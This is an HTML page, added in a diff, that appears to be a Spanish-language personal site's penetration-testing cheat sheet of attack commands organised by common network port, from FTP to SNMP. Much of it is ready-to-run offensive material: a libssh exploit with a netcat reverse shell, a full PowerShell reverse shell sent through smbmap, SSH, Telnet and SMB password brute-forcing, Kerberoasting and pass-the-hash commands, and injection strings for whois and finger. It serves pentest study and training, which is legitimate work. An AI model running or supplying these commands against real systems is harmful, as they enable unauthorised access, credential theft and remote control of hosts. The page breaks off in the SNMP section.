@@ -1,0 +1,429 @@
+<!DOCTYPE html> <html lang="es"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Ports | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content="un tema simples para academicos. Baseado no design do [*folio](https://github.com/bogoli/-folio)."> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link defer href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="/assets/img/logos/m1N147z1.png?c5fa12f00bf81b0bfdfb738a6722b18c"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://atz1luth.github.io/es/projects/ports/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/es/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/es/">\ c4s4 / </a> </li> <li class="nav-item "> <a class="nav-link" href="/es/blog/">/ d14R1o \ </a> </li> <li class="nav-item active"> <a class="nav-link" href="/es/projects/">\ d0Cs / <span class="sr-only">(current)</span> </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">/ mÁs \ </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/es/about/">acerca de</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/es/repos/">repositories</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/es/cv/">Cv</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/es/news/">news</a> <div class="dropdown-divider"></div> </div> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/ports/"> EN</a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <h1 id="common-ports">Common Ports</h1> <hr> <h2 id="general">General</h2> <hr> <p>AIO <a href="http://0daysecurity.com/penetration-testing/enumeration.html" rel="external nofollow noopener" target="_blank">Penetration Testing Methodology - 0DAYsecurity.com</a></p> <p><br></p> <h3 id="21---ftp">21 - FTP</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> ftp-<span class="k">*</span> <span class="nt">-p</span> 21 10.11.1.111
+</code></pre></div></div> <p><br></p> <h3 id="22---ssh">22 - SSH</h3> <hr> <ul> <li>If you have usernames test login with username:username</li> <li>Vulnerable Versions to user enum: &lt;7.7</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Enum SSH</span>
+<span class="c"># Get version</span>
+nmap 10.11.1.1 <span class="nt">-p22</span> <span class="nt">-sV</span>
+<span class="c"># Get banner</span>
+nc 10.11.1.1 22
+<span class="c"># Get login banner</span>
+ssh root@10.11.11.1
+<span class="c"># Get algorythms supporteed</span>
+nmap <span class="nt">-p22</span> 10.11.1.1 <span class="nt">--script</span> ssh2-enum-algos
+<span class="c"># Check weak keys</span>
+nmap-p22 10.2.1.1 <span class="nt">--script</span> ssh-hostkey <span class="nt">--script-args</span> <span class="nv">ssh_hostkey</span><span class="o">=</span>full
+<span class="c"># Check auth methods</span>
+nmap <span class="nt">-p22</span> 10.11.1.1 <span class="nt">--script</span> ssh-auth-methods <span class="nt">--script-args</span><span class="o">=</span><span class="s2">"ssh.user=admin"</span>
+
+<span class="c"># User can ask to execute a command right after authentication before it’s default command or shell is executed</span>
+<span class="nv">$ </span>ssh <span class="nt">-v</span> user@10.10.1.111 <span class="nb">id</span>
+...
+Password:
+debug1: Authentication succeeded <span class="o">(</span>keyboard-interactive<span class="o">)</span><span class="nb">.</span>
+Authenticated to 10.10.1.111 <span class="o">([</span>10.10.1.1114]:22<span class="o">)</span><span class="nb">.</span>
+debug1: channel 0: new <span class="o">[</span>client-session]
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: network
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: Sending <span class="nb">command</span>: <span class="nb">id
+</span>debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
+debug1: channel 0: free: client-session, nchannels 1
+Transferred: sent 2412, received 2480 bytes, <span class="k">in </span>0.1 seconds
+Bytes per second: sent 43133.4, received 44349.5
+debug1: Exit status 0
+
+<span class="c"># Check Auth Methods:</span>
+<span class="nv">$ </span>ssh <span class="nt">-v</span> 10.10.1.111
+OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
+...
+debug1: Authentications that can <span class="k">continue</span>: publickey,password,keyboard-interactive
+
+<span class="c"># Force Auth Method:</span>
+<span class="nv">$ </span>ssh <span class="nt">-v</span> 10.10.1.111 <span class="nt">-o</span> <span class="nv">PreferredAuthentications</span><span class="o">=</span>password
+...
+debug1: Next authentication method: password
+
+<span class="c"># BruteForce:</span>
+patator ssh_login <span class="nv">host</span><span class="o">=</span>10.11.1.111 <span class="nv">port</span><span class="o">=</span>22 <span class="nv">user</span><span class="o">=</span>root <span class="nv">0</span><span class="o">=</span>/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Authentication failed.'</span>
+hydra <span class="nt">-l</span> user <span class="nt">-P</span> /usr/share/wordlists/password/rockyou.txt <span class="nt">-e</span> s ssh://10.10.1.111
+medusa <span class="nt">-h</span> 10.10.1.111 <span class="nt">-u</span> user <span class="nt">-P</span> /usr/share/wordlists/password/rockyou.txt <span class="nt">-e</span> s <span class="nt">-M</span> ssh
+ncrack <span class="nt">--user</span> user <span class="nt">-P</span> /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
+
+<span class="c"># LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access</span>
+<span class="c"># Id</span>
+python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 <span class="nb">id</span>
+<span class="c"># Reverse</span>
+python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.1.111 80 &gt;/tmp/f"</span>
+
+<span class="c"># SSH FUZZ</span>
+<span class="c"># https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt</span>
+
+<span class="c"># cpan Net::SSH2</span>
+./sshfuzz.pl <span class="nt">-H</span> 10.10.1.111 <span class="nt">-P</span> 22 <span class="nt">-u</span> user <span class="nt">-p</span> user
+
+use auxiliary/fuzzers/ssh/ssh_version_2
+
+<span class="c"># SSH-AUDIT</span>
+<span class="c"># https://github.com/arthepsy/ssh-audit</span>
+
+<span class="c"># Enum users &lt; 7.7:</span>
+<span class="c"># https://www.exploit-db.com/exploits/45233</span>
+https://github.com/CaioCGH/EP4-redes/blob/master/attacker/sshUsernameEnumExploit.py
+python ssh_user_enum.py <span class="nt">--port</span> 2223 <span class="nt">--userList</span> /root/Downloads/users.txt IP 2&gt;/dev/null | <span class="nb">grep</span> <span class="s2">"is a"</span>
+
+<span class="c"># SSH Leaks:</span>
+https://shhgit.darkport.co.uk/
+
+<span class="c"># SSH bruteforce</span>
+<span class="c"># https://github.com/kitabisa/ssb</span>
+</code></pre></div></div> <p><br></p> <h3 id="23---telnet">23 - Telnet</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get banner</span>
+telnet 10.11.1.110
+<span class="c"># Bruteforce password</span>
+patator telnet_login <span class="nv">host</span><span class="o">=</span>10.11.1.110 <span class="nv">inputs</span><span class="o">=</span><span class="s1">'FILE0\nFILE1'</span> <span class="nv">0</span><span class="o">=</span>/root/Desktop/user.txt <span class="nv">1</span><span class="o">=</span>/root/Desktop/pass.txt  <span class="nv">persistent</span><span class="o">=</span>0 <span class="nv">prompt_re</span><span class="o">=</span><span class="s1">'Username: | Password:'</span>
+</code></pre></div></div> <p><br></p> <h3 id="25---smtp">25 - SMTP</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvv</span> 10.11.1.111 25
+HELO foo
+
+telnet 10.11.1.111 25
+VRFY root
+
+nmap <span class="nt">--script</span><span class="o">=</span>smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 <span class="nt">-p</span> 25 10.11.1.111
+smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-U</span> /root/sectools/SecLists/Usernames/Names/names.txt <span class="nt">-t</span> 10.11.1.111
+
+<span class="c"># SMTP relay</span>
+msfconsole
+use auxiliary/scanner/smtp/smtp_relay
+<span class="nb">set </span>RHOSTS &lt;IP or File&gt;
+<span class="nb">set </span>MAILFROM &lt;PoC email address&gt;
+<span class="nb">set </span>MAILTO &lt;your email address&gt;
+run
+
+<span class="c"># Send email unauth:</span>
+
+MAIL FROM:admin@admin.com
+RCPT TO:DestinationEmail@DestinationDomain.com
+DATA
+<span class="nb">test</span>
+
+<span class="nb">.</span>
+
+Receive:
+250 OK
+</code></pre></div></div> <p><br></p> <h3 id="43---whois">43 - Whois</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whois <span class="nt">-h</span> 10.10.1.111 <span class="nt">-p</span> 43 <span class="s2">"domain.com"</span>
+<span class="nb">echo</span> <span class="s2">"domain.com"</span> | nc <span class="nt">-vn</span> 10.10.1.111 43
+whois <span class="nt">-h</span> 10.10.1.111 <span class="nt">-p</span> 43 <span class="s2">"a') or 1=1#"</span>
+</code></pre></div></div> <p><br></p> <h3 id="53---dns">53 - DNS</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Transfer zone</span>
+
+dig AXFR domain.com @10.10.10.10
+<span class="c"># dig +multi AXFR @ns1.insecuredns.com insecuredns.com</span>
+dnsrecon <span class="nt">-t</span> axfr <span class="nt">-d</span> domain
+fierce <span class="nt">-dns</span> domain.com
+</code></pre></div></div> <p><br></p> <h3 id="69---udp---tftp">69 - UDP - TFTP</h3> <hr> <ul> <li>Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.</li> <li>Same checks as FTP Port 21.</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p69</span> <span class="nt">--script</span><span class="o">=</span>tftp-enum.nse 10.11.1.111
+</code></pre></div></div> <p><br></p> <h3 id="79---finger">79 - Finger</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-vn</span> 10.11.1.111 79
+<span class="nb">echo</span> <span class="s2">"root"</span> | nc <span class="nt">-vn</span> 10.11.1.111 79
+
+<span class="c"># User enumeration</span>
+finger @10.11.1.111       <span class="c">#List users</span>
+finger admin@10.11.1.111  <span class="c">#Get info of user</span>
+finger user@10.11.1.111   <span class="c">#Get info of user</span>
+
+finger <span class="s2">"|/bin/id@example.com"</span>
+finger <span class="s2">"|/bin/ls -a /@example.com"</span>
+</code></pre></div></div> <p><br></p> <h3 id="88---kerberos">88 - Kerberos</h3> <hr> <p>Check <a href="../post-exploitation/windows/ad/kerberos-attacks.md">Kerberos dedicated</a> section</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 88 <span class="nt">--script</span><span class="o">=</span>krb5-enum-users <span class="nt">--script-args</span><span class="o">=</span><span class="s2">"krb5-enum-users.realm='DOMAIN.LOCAL'"</span> IP
+use auxiliary/gather/kerberos_enumusers <span class="c"># MSF</span>
+
+<span class="c"># Check for Kerberoasting:</span>
+GetNPUsers.py DOMAIN-Target/ <span class="nt">-usersfile</span> user.txt <span class="nt">-dc-ip</span> &lt;IP&gt; <span class="nt">-format</span> hashcat/john
+
+<span class="c"># GetUserSPNs</span>
+ASREPRoast:
+impacket-GetUserSPNs &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; <span class="nt">-request</span> <span class="nt">-format</span> &lt;AS_REP_responses_format <span class="o">[</span>hashcat | john]&gt; <span class="nt">-outputfile</span> &lt;output_AS_REP_responses_file&gt;
+impacket-GetUserSPNs &lt;domain_name&gt;/ <span class="nt">-usersfile</span> &lt;users_file&gt; <span class="nt">-format</span> &lt;AS_REP_responses_format <span class="o">[</span>hashcat | john]&gt; <span class="nt">-outputfile</span> &lt;output_AS_REP_responses_file&gt;
+
+<span class="c"># Kerberoasting:</span>
+impacket-GetUserSPNs &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; <span class="nt">-outputfile</span> &lt;output_TGSs_file&gt;
+
+<span class="c"># Overpass The Hash/Pass The Key (PTK):</span>
+python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; <span class="nt">-hashes</span> <span class="o">[</span>lm_hash]:&lt;ntlm_hash&gt;
+python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; <span class="nt">-aesKey</span> &lt;aes_key&gt;
+python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt;:[password]
+
+<span class="c"># Using TGT key to excute remote commands from the following impacket scripts:</span>
+
+python3 psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
+python3 smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
+python3 wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
+
+<span class="c"># https://www.tarlogic.com/blog/como-funciona-kerberos/</span>
+<span class="c"># https://www.tarlogic.com/blog/como-atacar-kerberos/</span>
+
+python kerbrute.py <span class="nt">-dc-ip</span> IP <span class="nt">-users</span> /root/htb/kb_users.txt <span class="nt">-passwords</span> /root/pass_common_plus.txt <span class="nt">-threads</span> 20 <span class="nt">-domain</span> DOMAIN <span class="nt">-outputfile</span> kb_extracted_passwords.txt
+
+<span class="c"># https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/</span>
+<span class="c"># https://github.com/GhostPack/Rubeus</span>
+<span class="c"># https://github.com/fireeye/SSSDKCMExtractor</span>
+<span class="c"># https://gitlab.com/Zer1t0/cerbero</span>
+</code></pre></div></div> <p><br></p> <h3 id="110---pop3">110 - Pop3</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 10.11.1.111
+USER pelle@10.11.1.111
+PASS admin
+
+<span class="c"># or:</span>
+
+USER pelle
+PASS admin
+
+<span class="c"># List all emails</span>
+list
+
+<span class="c"># Retrieve email number 5, for example</span>
+retr 9
+</code></pre></div></div> <p><br></p> <h3 id="111---rpcbind">111 - Rpcbind</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcinfo <span class="nt">-p</span> 10.11.1.111
+rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.11.1.111
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+</code></pre></div></div> <p><br></p> <h3 id="135---msrpc">135 - MSRPC</h3> <hr> <p>Some versions are vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap 10.11.1.111 <span class="nt">--script</span><span class="o">=</span>msrpc-enum
+msf <span class="o">&gt;</span> use exploit/windows/dcerpc/ms03_026_dcom
+
+<span class="c"># Endpoint Mapper Service Discovery</span>
+use auxiliary/scanner/dcerpc/endpoint_mapper
+
+<span class="c">#Hidden DCERPC Service Discovery</span>
+use auxiliary/scanner/dcerpc/hidden
+
+<span class="c"># Remote Management Interface Discovery</span>
+use auxiliary/scanner/dcerpc/management
+
+<span class="c"># DCERPC TCP Service Auditor</span>
+use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+
+impacket-rpcdump
+
+<span class="c"># Enum network interface</span>
+<span class="c"># https://github.com/mubix/IOXIDResolver</span>
+</code></pre></div></div> <p><br></p> <h3 id="139445---smb">139/445 - SMB</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Enum hostname</span>
+enum4linux <span class="nt">-n</span> 10.11.1.111
+nmblookup <span class="nt">-A</span> 10.11.1.111
+nmap <span class="nt">--script</span><span class="o">=</span>smb-enum<span class="k">*</span> <span class="nt">--script-args</span><span class="o">=</span><span class="nv">unsafe</span><span class="o">=</span>1 <span class="nt">-T5</span> 10.11.1.111
+
+<span class="c"># Get Version</span>
+smbver.sh 10.11.1.111
+Msfconsole<span class="p">;</span>use scanner/smb/smb_version
+ngrep <span class="nt">-i</span> <span class="nt">-d</span> tap0 <span class="s1">'s.?a.?m.?b.?a.*[[:digit:]]'</span>
+smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.11.1.111
+
+<span class="c"># Get Shares</span>
+smbmap <span class="nt">-H</span>  10.11.1.111 <span class="nt">-R</span>
+<span class="nb">echo exit</span> | smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.11.1.111
+smbclient <span class="se">\\\\</span>10.11.1.111<span class="se">\\</span>
+smbclient <span class="nt">-L</span> //10.11.1.111 <span class="nt">-N</span>
+nmap <span class="nt">--script</span> smb-enum-shares <span class="nt">-p139</span>,445 <span class="nt">-T4</span> <span class="nt">-Pn</span> 10.11.1.111
+smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.11.1.111<span class="se">\\</span>
+<span class="c"># If got error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"</span>
+smbclient <span class="nt">-L</span> //10.11.1.111/ <span class="nt">--option</span><span class="o">=</span><span class="s1">'client min protocol=NT1'</span>
+
+<span class="c"># Check null sessions</span>
+smbmap <span class="nt">-H</span> 10.11.1.111
+rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 10.11.1.111
+smbclient //10.11.1.111/IPC<span class="nv">$ </span><span class="nt">-N</span>
+
+<span class="c"># Exploit null sessions</span>
+enum <span class="nt">-s</span> 10.11.1.111
+enum <span class="nt">-U</span> 10.11.1.111
+enum <span class="nt">-P</span> 10.11.1.111
+enum4linux <span class="nt">-a</span> 10.11.1.111
+<span class="c">#https://github.com/cddmp/enum4linux-ng/</span>
+enum4linux-ng.py 10.11.1.111 <span class="nt">-A</span> <span class="nt">-C</span>
+/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111
+
+<span class="c"># Connect to username shares</span>
+smbclient //10.11.1.111/share <span class="nt">-U</span> username
+
+<span class="c"># Connect to share anonymously</span>
+smbclient <span class="se">\\\\</span>10.11.1.111<span class="se">\\</span>
+smbclient //10.11.1.111/
+smbclient //10.11.1.111/
+smbclient //10.11.1.111/&lt;<span class="s2">""</span>share name<span class="s2">""</span><span class="o">&gt;</span>
+rpcclient <span class="nt">-U</span> <span class="s2">" "</span> 10.11.1.111
+rpcclient <span class="nt">-U</span> <span class="s2">" "</span> <span class="nt">-N</span> 10.11.1.111
+
+<span class="c"># Check vulns</span>
+nmap <span class="nt">--script</span> smb-vuln<span class="k">*</span> <span class="nt">-p139</span>,445 <span class="nt">-T4</span> <span class="nt">-Pn</span> 10.11.1.111
+
+<span class="c"># Multi exploits</span>
+msfconsole<span class="p">;</span> use exploit/multi/samba/usermap_script<span class="p">;</span> <span class="nb">set </span>lhost 192.168.0.X<span class="p">;</span> <span class="nb">set </span>rhost 10.11.1.111<span class="p">;</span> run
+
+<span class="c"># Bruteforce login</span>
+medusa <span class="nt">-h</span> 10.11.1.111 <span class="nt">-u</span> userhere <span class="nt">-P</span> /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt <span class="nt">-M</span> smbnt
+nmap <span class="nt">-p445</span> <span class="nt">--script</span> smb-brute <span class="nt">--script-args</span> <span class="nv">userdb</span><span class="o">=</span>userfilehere,passdb<span class="o">=</span>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  <span class="nt">-vvvv</span>
+nmap –script smb-brute 10.11.1.111
+
+<span class="c"># nmap smb enum &amp; vuln</span>
+nmap <span class="nt">--script</span> smb-enum-<span class="k">*</span>,smb-vuln-<span class="k">*</span>,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols <span class="nt">-p</span> 139,445 10.11.1.111
+nmap <span class="nt">--script</span> smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse <span class="nt">-p</span> 139,445 10.11.1.111
+
+<span class="c"># Mount smb volume linux</span>
+mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>user,password<span class="o">=</span>password //x.x.x.x/share /mnt/share
+
+<span class="c"># rpcclient commands</span>
+rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.11.1.111
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+
+<span class="c"># Run cmd over smb from linux</span>
+winexe <span class="nt">-U</span> username //10.11.1.111 <span class="s2">"cmd.exe"</span> <span class="nt">--system</span>
+
+<span class="c"># smbmap</span>
+smbmap.py <span class="nt">-H</span> 10.11.1.111 <span class="nt">-u</span> administrator <span class="nt">-p</span> asdf1234 <span class="c">#Enum</span>
+smbmap.py <span class="nt">-u</span> username <span class="nt">-p</span> <span class="s1">'P@$$w0rd1234!'</span> <span class="nt">-d</span> DOMAINNAME <span class="nt">-x</span> <span class="s1">'net group "Domain Admins" /domain'</span> <span class="nt">-H</span> 10.11.1.111 <span class="c">#RCE</span>
+smbmap.py <span class="nt">-H</span> 10.11.1.111 <span class="nt">-u</span> username <span class="nt">-p</span> <span class="s1">'P@$$w0rd1234!'</span> <span class="nt">-L</span> <span class="c"># Drive Listing</span>
+smbmap.py <span class="nt">-u</span> username <span class="nt">-p</span> <span class="s1">'P@$$w0rd1234!'</span> <span class="nt">-d</span> ABC <span class="nt">-H</span> 10.11.1.111 <span class="nt">-x</span> <span class="s1">'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'</span> <span class="c"># Reverse Shell</span>
+
+<span class="c"># Check</span>
+<span class="se">\P</span>olicies<span class="se">\{</span>REG<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml look <span class="k">for </span>user&amp;pass <span class="s2">"gpp-decrypt "</span>
+
+<span class="c"># CrackMapExec</span>
+crackmapexec smb 10.55.100.0/23 <span class="nt">-u</span> LA-ITAdmin <span class="nt">-H</span> 573f6308519b3df23d9ae2137f549b15 <span class="nt">--local</span>
+crackmapexec smb 10.55.100.0/23 <span class="nt">-u</span> LA-ITAdmin <span class="nt">-H</span> 573f6308519b3df23d9ae2137f549b15 <span class="nt">--local</span> <span class="nt">--lsa</span>
+
+<span class="c"># Impacket</span>
+python3 samdump.py SMB 172.21.0.0
+
+<span class="c"># Check for systems with SMB Signing not enabled</span>
+python3 RunFinger.py <span class="nt">-i</span> 172.21.0.0/24
+</code></pre></div></div> <p><br></p> <h3 id="161162-udp---snmp">161/162 UDP - SNMP</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-vv</span> <span class="nt">-sV</span> <span class="nt">-sU</span> <span class="nt">-Pn</span> <span class="nt">-p</span> 161,162 <span class="nt">--script</span><span class="o">=</span>snmp-netstat,snmp-processes 10.11.1.111
+nmap 10.11.1.111 <span class="nt">-Pn</span> <span class="nt">-sU</span> <span class="nt">-p</span> 161 <span class="nt">--script</span><span class="o">=</span>snmp-brute,snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-ios-config,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users
+snmp-check 10.11.1.111 <span class="nt">-c</span> public|private|community
+snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> ipaddress 1
+snmpwalk <span class="nt">-c</span> private <span class="nt">-v1</span> ipaddress 1
+snmpwalk <span class="nt">-c</span> manager <span class="nt">-v1</span> ipaddress 1
+onesixtyone <span class="nt">-c</span> /usr/share/doc/onesixtyone/dict.txt 172.21.0.X
+
+<span class="c"># Impacket</span>
+python3 samdump.py SNMP 172.21.0.0
+
+<span class="c"># MSF aux modules</span>
+ auxiliary/scanner/misc/oki_scanner
+ auxiliary/scanner/snmp/aix_version
+ auxiliary/scanner/snmp/arris_dg950
+ auxiliary/scanner/snmp/brocade_enumhash
+ auxiliary/scanner/snmp/cisco_config_tftp
+ auxiliary/scanner/snmp/cisco_upload_file
+ auxiliary/scanner/snmp/cnpilot_r_snmp_loot
